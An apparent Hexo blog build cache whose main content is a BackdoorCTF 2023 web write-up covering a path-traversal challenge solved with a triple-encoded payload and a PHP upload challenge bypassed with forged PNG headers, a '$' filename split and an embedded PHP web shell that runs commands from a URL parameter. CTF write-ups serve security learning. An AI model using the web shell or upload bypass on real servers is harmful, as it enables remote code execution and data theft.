0327a36f725076fe82fdf626","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_highlight/tomorrow-night.styl","hash":"16ba09b2db501e4e3e2e7d62595d9bf935bf27c4","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_highlight/vs.styl","hash":"959a746f4b37aacb5d1d6ff1d57e0c045289d75d","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_highlight/xcode.styl","hash":"5e8532ae8366dcf6a4ef5e4813dc3d42ab3d0a50","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_highlight/tomorrow.styl","hash":"15779cf6846725c7c35fc56cac39047d7e0aec1c","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/archive.styl","hash":"31aef892437d5734a134c34f2a8a6610a8f671c3","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_highlight/zenburn.styl","hash":"68ff9332ccc03f9389b15b713415cde016f8088f","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/categories.styl","hash":"a43f00e61b3507f130b8a3f8108a4eeca147c2a0","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/article.styl","hash":"258370d8ab98e63804ead9bc030f633ca97a1235","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/comments.styl","hash":"1e90f1fb9d4c155df518cacb5a537e9de9c042c1","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/header.styl","hash":"8ce12f14382b6d471e3fe1266573b34fa84deaa0","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/footer.styl","hash":"61c2c7c5f73a0022ec41830bea0812a97f522d7c","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/pagination.styl","hash":"950bf517bbe7adb9a9aa4eb5ddec74ffc7598787","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/index.styl","hash":"59c99f4ea3a73bf47ce030df166c5e33d5de31fb","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/search.styl","hash":"159be002780c62a77f46947cf854a7342fba24f4","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/tooltip.styl","hash":"2daff581ec3efaec840cbfdee512195919c32629","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/tags.styl","hash":"d571d5c7c960300d29c5f0ec3fe1140322ecd6b3","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/lib/clipboard/clipboard.min.js","hash":"9a7cb405f9beed005891587d41f76a0720893ffc","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Black.woff2","hash":"7ea4fd7dd4cd4f480af78a0e2c5849eb921b1aeb","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Black.woff","hash":"f6fda2de0348b3e3b7de73267f9f8e97a62f8353","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Bold.woff","hash":"56e632c9196fac364c66f812a3b4635dd999ad1c","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Bold.woff2","hash":"6e40d0c7669c1adbcbf034bdc459f7bed4d6676d","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Light.woff2","hash":"50b654d916204c30987d1987abd890ef92085ae3","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Light.woff","hash":"1c3dbf17411b1f6a6b22c2b76e9d8511586643d0","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Medium.woff","hash":"43a8aaa3fca8721dd32a5d20f7a98dfbc87c97fd","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Medium.woff2","hash":"14b3e257c51a6a11d23b2a078017ff340c9777e4","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Regular.woff2","hash":"a9714ffb842afc74836e64de04b52d8c37c87c8a","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Regular.woff","hash":"235889d59ddad2b1f3243ccaab7733bd713a2a21","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Thin.woff2","hash":"9b03b1a9071709f5b7dbca13412ecef6cb7a2a67","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Thin.woff","hash":"c0e784de2eb5261cca244928f8a81fd893c3fe16","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/font-face.css","hash":"ba0030e1cd28a8caa7a5bb74b98da7c7bb185c90","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Variable.woff","hash":"2e8e6d38d361def5f48baac366f04e3db3ed4828","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/css/_partial/post/actions_desktop.styl","hash":"a1f36f9a3fd5ffcd832bf39e9402678978035d48","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/css/_partial/post/actions_mobile.styl","hash":"0d2966c1d870392476864af8ee3ba312ba30cb82","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Variable.woff2","hash":"e213bb26bc7f10e1df3fe2d03d3ecaecd6e6d371","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"fb363d27cfdfe71a243fa2ac3dab2815232b9b7e","modified":1715685798687},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"67afa6237670ab99125056f2899129f22912dcf3","modified":1715685798687},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-v4compatibility.woff2","hash":"8f80d0bbe995f7fe92320fdaec10cd5ccd710a51","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-v4compatibility.ttf","hash":"a9d072aca9e0fadc2a7167671ce3d6b18d9cd2cc","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/justified-gallery/css/justifiedGallery.min.css","hash":"dd3052149d3054f35efb823c68dd78e78aad5875","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/images/favicon-192x192.png","hash":"eb4ce1736089fcd313b033a0e54a92cbcee9f84d","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/lib/jquery/jquery.min.js","hash":"eda46747c71d38a880bee44f9a439c3858bb8f99","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Black.eot","hash":"91152bd73e7ff8d943e3bde3ddb0fa0a018e1c21","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Black.ttf","hash":"b65915e3fa57b5c19995d15dc2341d115c1971b9","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Bold.eot","hash":"5c1c680fade45393e4a5bb4548a092cd5ea6811e","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Bold.ttf","hash":"122bb778b17a152c426a825ee981610a4bd59bf3","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Light.eot","hash":"a059359e9bea17dc2ff2ede955a05bf0dc4d00d0","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Light.ttf","hash":"df82b80c4d3b11e70dcd269fc62ac97cbfa0414d","modified":1715685798715},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Medium.eot","hash":"d9ec1f9f3fefd57e446cbe86dc297f1ff269b6de","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Medium.ttf","hash":"948a091f0fdb8c7ae17d5ef8e51bd8830d65dd9a","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Regular.eot","hash":"521c01f0eb79a48025e972ecbe21b0d7fb15437b","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Regular.ttf","hash":"643c28c8f8a2bce1a0d62525aa045cd9883773cd","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Thin.eot","hash":"a0ea0bdaef00b35544f9a21d25d35db9a79f7189","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Thin.ttf","hash":"6aacb0eecb03c660570b6e159ba5ca97ca7461cf","modified":1715685798719},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Variable.eot","hash":"af46f7f4e10a1440a4c97b350622d279143e6798","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/vazir-font/Vazir-Variable.ttf","hash":"1e08b6373c2e086f24776df9b11e4be6bbcc8a4a","modified":1715685798723},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"4350f9ba93384634faf35f41c503c99c767f1069","modified":1715685798687},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/css/all.min.css","hash":"8c06d82739d14b094ff6d9036021a252bd1d985d","modified":1715685798687},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f0982a77285d53653845b0a78170b4688db972f1","modified":1715685798687},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"6b99aa650bd12a36caa14e0127435d8f4cd3ba73","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"20bd663830188cbadd2264e1daf9497c3ffc3621","modified":1715685798691},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"96c97a0a098ca40802f948ae56fa37aa6683d034","modified":1715685798699},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"68700db02debd4b922304134da83b829cbfddfc9","modified":1715685798707},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"7f7cdbdcc26279c04046632e22d872f111bc9399","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/images/logo.png","hash":"67366454923e76394fca5a09784b2be3e2a83c97","modified":1715685798683},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"bfa1ed9a263ed78462f06d322de13bd5bd0906b2","modified":1715685798695},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"a9a431fc7a6c3a67c98021d4035c12a07a4f1070","modified":1715685798695},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"a8a8df3393bccc365335fc5eb0a62a6b7ccd32b9","modified":1715685798703},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"2b912dd13f052f645ee19951604610bb350d50af","modified":1715685798703},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"65ddb11e75ee93909e845ab912a36717c48f1c94","modified":1715685798707},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"5e220152adefe905b2197f873d7cee99eca50e91","modified":1715685798707},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"df202ce09cbdc70bc16b81983a13ef0f94e46f10","modified":1715685798707},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"d895a1bd25e36c58b7f463ebe14de09f186d5ab4","modified":1715685798711},{"_id":"themes/hexo-theme-cactus/source/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"56fa0e33a390b704afc56af93a31576ccdbbdd9e","modified":1715685798711},{"_id":"public/404.html","hash":"561d985d9c1db59450bcd7bfa8db1334d1201a12","modified":1715685993193},{"_id":"public/images/apple-touch-icon.png","hash":"4c8e172e17f193d2d695195d81dd4c3c4fa80169","modified":1715685944702},{"_id":"public/images/favicon.ico","hash":"387ec50946205af491dc07b147d99d4f1d1b0dce","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Black.woff","hash":"f6fda2de0348b3e3b7de73267f9f8e97a62f8353","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Black.woff2","hash":"7ea4fd7dd4cd4f480af78a0e2c5849eb921b1aeb","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Bold.woff","hash":"56e632c9196fac364c66f812a3b4635dd999ad1c","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Bold.woff2","hash":"6e40d0c7669c1adbcbf034bdc459f7bed4d6676d","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Light.woff2","hash":"50b654d916204c30987d1987abd890ef92085ae3","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Light.woff","hash":"1c3dbf17411b1f6a6b22c2b76e9d8511586643d0","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Medium.woff2","hash":"14b3e257c51a6a11d23b2a078017ff340c9777e4","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Medium.woff","hash":"43a8aaa3fca8721dd32a5d20f7a98dfbc87c97fd","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Regular.woff","hash":"235889d59ddad2b1f3243ccaab7733bd713a2a21","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Regular.woff2","hash":"a9714ffb842afc74836e64de04b52d8c37c87c8a","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Thin.woff2","hash":"9b03b1a9071709f5b7dbca13412ecef6cb7a2a67","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Thin.woff","hash":"c0e784de2eb5261cca244928f8a81fd893c3fe16","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Variable.woff2","hash":"e213bb26bc7f10e1df3fe2d03d3ecaecd6e6d371","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Variable.woff","hash":"2e8e6d38d361def5f48baac366f04e3db3ed4828","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"fb363d27cfdfe71a243fa2ac3dab2815232b9b7e","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"67afa6237670ab99125056f2899129f22912dcf3","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.woff2","hash":"8f80d0bbe995f7fe92320fdaec10cd5ccd710a51","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.ttf","hash":"a9d072aca9e0fadc2a7167671ce3d6b18d9cd2cc","modified":1715685944702},{"_id":"public/images/favicon-192x192.png","hash":"eb4ce1736089fcd313b033a0e54a92cbcee9f84d","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Black.eot","hash":"91152bd73e7ff8d943e3bde3ddb0fa0a018e1c21","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Black.ttf","hash":"b65915e3fa57b5c19995d15dc2341d115c1971b9","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Bold.eot","hash":"5c1c680fade45393e4a5bb4548a092cd5ea6811e","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Bold.ttf","hash":"122bb778b17a152c426a825ee981610a4bd59bf3","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Light.eot","hash":"a059359e9bea17dc2ff2ede955a05bf0dc4d00d0","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Light.ttf","hash":"df82b80c4d3b11e70dcd269fc62ac97cbfa0414d","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Medium.eot","hash":"d9ec1f9f3fefd57e446cbe86dc297f1ff269b6de","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Medium.ttf","hash":"948a091f0fdb8c7ae17d5ef8e51bd8830d65dd9a","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Regular.ttf","hash":"643c28c8f8a2bce1a0d62525aa045cd9883773cd","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Regular.eot","hash":"521c01f0eb79a48025e972ecbe21b0d7fb15437b","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Thin.eot","hash":"a0ea0bdaef00b35544f9a21d25d35db9a79f7189","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Thin.ttf","hash":"6aacb0eecb03c660570b6e159ba5ca97ca7461cf","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Variable.eot","hash":"af46f7f4e10a1440a4c97b350622d279143e6798","modified":1715685944702},{"_id":"public/lib/vazir-font/Vazir-Variable.ttf","hash":"1e08b6373c2e086f24776df9b11e4be6bbcc8a4a","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"4350f9ba93384634faf35f41c503c99c767f1069","modified":1715685944702},{"_id":"public/css/rtl.css","hash":"9589fac02a34fd9084f805f801889028756bbb65","modified":1715685944702},{"_id":"public/js/search.js","hash":"914a2ce72fb325106c61600200be823b72bfb39f","modified":1715685944702},{"_id":"public/js/main.js","hash":"619ac6529d140711e3b14f739a192bb31c4824ff","modified":1715685944702},{"_id":"public/lib/clipboard/clipboard.min.js","hash":"9a7cb405f9beed005891587d41f76a0720893ffc","modified":1715685944702},{"_id":"public/lib/vazir-font/font-face.css","hash":"ba0030e1cd28a8caa7a5bb74b98da7c7bb185c90","modified":1715685944702},{"_id":"public/lib/justified-gallery/css/justifiedGallery.min.css","hash":"dd3052149d3054f35efb823c68dd78e78aad5875","modified":1715685944702},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1715685944702},{"_id":"public/lib/jquery/jquery.min.js","hash":"eda46747c71d38a880bee44f9a439c3858bb8f99","modified":1715685944702},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"8c06d82739d14b094ff6d9036021a252bd1d985d","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f0982a77285d53653845b0a78170b4688db972f1","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"6b99aa650bd12a36caa14e0127435d8f4cd3ba73","modified":1715685944702},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"20bd663830188cbadd2264e1daf9497c3ffc3621","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"96c97a0a098ca40802f948ae56fa37aa6683d034","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"68700db02debd4b922304134da83b829cbfddfc9","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"7f7cdbdcc26279c04046632e22d872f111bc9399","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"bfa1ed9a263ed78462f06d322de13bd5bd0906b2","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"a9a431fc7a6c3a67c98021d4035c12a07a4f1070","modified":1715685944702},{"_id":"public/images/logo.png","hash":"67366454923e76394fca5a09784b2be3e2a83c97","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"a8a8df3393bccc365335fc5eb0a62a6b7ccd32b9","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"2b912dd13f052f645ee19951604610bb350d50af","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"65ddb11e75ee93909e845ab912a36717c48f1c94","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"5e220152adefe905b2197f873d7cee99eca50e91","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"df202ce09cbdc70bc16b81983a13ef0f94e46f10","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"d895a1bd25e36c58b7f463ebe14de09f186d5ab4","modified":1715685944702},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"56fa0e33a390b704afc56af93a31576ccdbbdd9e","modified":1715685944702}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"BackDoorCTF 2023 Writeup","_content":"# BackdoorCTF 2023\n\n# Web/Beginner/Secret_of_jackal\n\n## Challenge Overview\n\nDescription: I left a message for you. You will love it definitely\n\nAuthor: j4ck4l :>)\n\n![Index](./images/backdoorctf23/secret/index.png)\n\nWe have been given a [website](http://35.222.114.240:8003). It's a simple lfi challenge\n\n\nHmm so to understand the functionality more let's see the source code\n\n\n```python\ndef ignore_it(file_param):\n    yoooo = file_param.replace('.', '').replace('/', '')\n    if yoooo != file_param:\n        return \"Illegal characters detected in file parameter!\"\n    return yoooo\n\ndef another_useless_function(file_param):\n    return urllib.parse.unquote(file_param)\n\ndef url_encode_path(file_param):\n    return urllib.parse.quote(file_param, safe='')\n\ndef useless (file_param):\n    file_param1 = ignore_it(file_param)\n    file_param2 = another_useless_function(file_param1)\n    file_param3 = ignore_it(file_param2)\n    file_param4 = another_useless_function(file_param3)\n    file_param5 = another_useless_function(file_param4)\n    return file_param5\n```\n\n\n## Vulnerability Identification\n\nOkay so let's analyse it block by block.\n\nIt's a simple page which include local files. So if you try to read flag file which is one directory back as given in the Dockerfile it will give you a message which says `\"Illegal characters detected in file parameter!\"`\n\nSo if we see the code the `useless()` first sanatise the output using `ignore_it()` function and will remove the `/ & .` characters and then url decodes it using `another_useless_function`\n\n\n## Exploiting the Vulnerability\n\nIf you execute this code locally if you encode the file path 2 times it should give you the flag but it will not run on the server.\n\nBecause chrome already decodes the url 1 time and then 2 times it will be done by our code so in total 3 times we have to encode the file path.\n\nSo our final payload is `%25252E%25252E%25252Fflag%25252Etxt`\n\n## Obtaining the Flag\nSo after giving the payload you will get the flag\n\n![Flag](./images/backdoorctf23/secret/flag.png)\n\nFlag: **flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}**\n\n# Web/php_sucks\n\n## Challenge Overview\n\nDescription: I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it. \n\nAuthor: j4ck4l :>)\n\n![Index](./images/backdoorctf23/php/index.png)\n\nWe have been given a [website](http://35.222.114.240:8002/chal/upload.php). We can see a simple upload form.\n\nLet's try to upload a text file. And the server responds with `File size should be less than 200KB, and only png, jpeg, and jpg are alloweded`\n\n![error1](./images/backdoorctf23/php/error1.png)\n\nHmm so to understand the functionality more let's see the source code\n\nThe code is obfuscated and in a single line, let's use an online beautifier and we get the below source code\n\n```php\n<?php \n$allowedExtensions = [\"jpg\", \"jpeg\", \"png\"];\n$errorMsg = \"\";\nif (\n    $_SERVER[\"REQUEST_METHOD\"] === \"POST\" &&\n    isset($_FILES[\"file\"]) &&\n    isset($_POST[\"name\"])\n) {\n    $userName = $_POST[\"name\"];\n    $uploadDir = \"uploaded/\" . generateHashedDirectory($userName) . \"/\";\n    if (!is_dir($uploadDir)) {\n        mkdir($uploadDir, 0750, true);\n    }\n    $uploadedFile = $_FILES[\"file\"];\n    $fileName = $uploadedFile[\"name\"];\n    $fileTmpName = $uploadedFile[\"tmp_name\"];\n    $fileError = $uploadedFile[\"error\"];\n    $fileSize = $uploadedFile[\"size\"];\n    $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n    if (in_array($fileExt, $allowedExtensions) && $fileSize < 200000) {\n        $fileName = urldecode($fileName);\n        $fileInfo = finfo_open(FILEINFO_MIME_TYPE);\n        $fileMimeType = finfo_file($fileInfo, $fileTmpName);\n        finfo_close($fileInfo);\n        $allowedMimeTypes = [\"image/jpeg\", \"image/jpg\", \"image/png\"];\n        $fileName = strtok($fileName, chr(7841151584512418084));\n        if (in_array($fileMimeType, $allowedMimeTypes)) {\n            if ($fileError === UPLOAD_ERR_OK) {\n                if (move_uploaded_file($fileTmpName, $uploadDir . $fileName)) {\n                    chmod($uploadDir . $fileName, 0440);\n                    echo \"File uploaded successfully. <a href='$uploadDir$fileName' target='_blank'>Open File</a>\";\n                } else {\n                    $errorMsg = \"Error moving the uploaded file.\";\n                }\n            } else {\n                $errorMsg = \"File upload failed with error code: $fileError\";\n            }\n        } else {\n            $errorMsg = \"Don't try to fool me, this is not a png file\";\n        }\n    } else {\n        $errorMsg =\n            \"File size should be less than 200KB, and only png, jpeg, and jpg are allowed\";\n    }\n}\nfunction generateHashedDirectory($userName)\n{\n    $randomSalt = bin2hex(random_bytes(16));\n    $hashedDirectory = hash(\"sha256\", $userName . $randomSalt);\n    return $hashedDirectory;\n} ?>\n```\n\n\n## Vulnerability Identification\n\nOkay so let's analyse it block by block.\n\nIt first asks for a file and then it checks the file extension using \n```php\n$fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n if (in_array($fileExt, $allowedExtensions) && $fileSize < 200000)\n ....... continued\n```\nso if the extension is `jpg, jpeg, png` and the file size is less than 200kb it will try to execute further instructions.\n\nOkay then if you pass the extension check we have another check that is the MIME type check. So if you try to fool the server by uploading a file like `exploit.php.png` but the file type is actually a `php` then the server will give you and error --> `Don't try to fool me, this is not a png file`.\n\n![error2](./images/backdoorctf23/php/error2.png)\n\nOkay so let's try to upload a file with the header `png/jpeg/jpg` \n\nWe can do it with a file using `xxd -r -p -o 0 <(echo 8950 4e47 0d0a 1a0a 0000 000d 4948 4452) exploit.php.png`\n\nSo if you check the file type now it will bypass the MIME check.\n\nBut the problem is if it is uploaded it will be uploaded as exploit.php.png so an image will open so it is not helpful to solve the challenge\n\n## Exploiting the Vulnerability\n\nSo to exploit this we will set the header of the file to **PNG**. And then we will inject some php code to exploit the server.\n\nWe will name this file as `exploit.php%00.png`. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.\n\nBut here is a twist.\n\nHave a look at this line of code \n\n```php\n$fileName = strtok($fileName, chr(7841151584512418084));\n```\n\nif you use php interactive shell you can see the `chr(7841151584512418084)` \n\n```\nphp > echo chr(7841151584512418084);\n$\nphp > echo urlencode(chr(7841151584512418084));\n%24\n```\nso the file name will be split by $.\n\nSo to exploit this we will create a file `exploit.php%24.png` or `exploit.php$.png` with header of png and content as \n\n```php\n�PNG\n^Z\n^@^@^@^MIHDR<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>\n```\n\n## Obtaining the Flag\nSo we will upload the file and the file name which will be uploaded will be `exploit.php` and when we open the file . BOOM we got the shell\n\nlet's do rce now and list the files two directories back we get the name of flag file as `s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt`\n\nand now `cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt` to read the file.\n\n![Flag](./images/backdoorctf23/php/flag.png) \n\nFlag: **flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}**\n\nThank You","source":"_posts/BackDoorCTF23_Web_Writeup.md","raw":"---\ntitle: BackDoorCTF 2023 Writeup\n---\n# BackdoorCTF 2023\n\n# Web/Beginner/Secret_of_jackal\n\n## Challenge Overview\n\nDescription: I left a message for you. You will love it definitely\n\nAuthor: j4ck4l :>)\n\n![Index](./images/backdoorctf23/secret/index.png)\n\nWe have been given a [website](http://35.222.114.240:8003). It's a simple lfi challenge\n\n\nHmm so to understand the functionality more let's see the source code\n\n\n```python\ndef ignore_it(file_param):\n    yoooo = file_param.replace('.', '').replace('/', '')\n    if yoooo != file_param:\n        return \"Illegal characters detected in file parameter!\"\n    return yoooo\n\ndef another_useless_function(file_param):\n    return urllib.parse.unquote(file_param)\n\ndef url_encode_path(file_param):\n    return urllib.parse.quote(file_param, safe='')\n\ndef useless (file_param):\n    file_param1 = ignore_it(file_param)\n    file_param2 = another_useless_function(file_param1)\n    file_param3 = ignore_it(file_param2)\n    file_param4 = another_useless_function(file_param3)\n    file_param5 = another_useless_function(file_param4)\n    return file_param5\n```\n\n\n## Vulnerability Identification\n\nOkay so let's analyse it block by block.\n\nIt's a simple page which include local files. So if you try to read flag file which is one directory back as given in the Dockerfile it will give you a message which says `\"Illegal characters detected in file parameter!\"`\n\nSo if we see the code the `useless()` first sanatise the output using `ignore_it()` function and will remove the `/ & .` characters and then url decodes it using `another_useless_function`\n\n\n## Exploiting the Vulnerability\n\nIf you execute this code locally if you encode the file path 2 times it should give you the flag but it will not run on the server.\n\nBecause chrome already decodes the url 1 time and then 2 times it will be done by our code so in total 3 times we have to encode the file path.\n\nSo our final payload is `%25252E%25252E%25252Fflag%25252Etxt`\n\n## Obtaining the Flag\nSo after giving the payload you will get the flag\n\n![Flag](./images/backdoorctf23/secret/flag.png)\n\nFlag: **flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}**\n\n# Web/php_sucks\n\n## Challenge Overview\n\nDescription: I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it. \n\nAuthor: j4ck4l :>)\n\n![Index](./images/backdoorctf23/php/index.png)\n\nWe have been given a [website](http://35.222.114.240:8002/chal/upload.php). We can see a simple upload form.\n\nLet's try to upload a text 